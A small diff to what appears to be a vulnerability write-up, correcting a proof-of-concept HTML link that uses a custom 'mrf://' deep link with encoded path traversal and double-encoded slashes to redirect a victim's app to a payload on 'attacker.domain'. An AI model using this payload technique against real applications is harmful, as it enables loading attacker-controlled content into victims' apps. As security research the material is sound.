@@ -191,7 +191,7 @@ the HTML below will redirect the victim to the manipulated JSON link
 <!DOCTYPE html>
 <html>
 <body>
-<a href="mrf://dphoeniixx/blog/..%2fredirect%2f%252f%252fattacker.domain/payload.json">Blog</a>
+<a href="mrf://dphoeniixx/blog/..%2fredirect%2f%252f%252fattacker.domain%252fpayload.json">Blog</a>
 </body>
 </html>
 ```
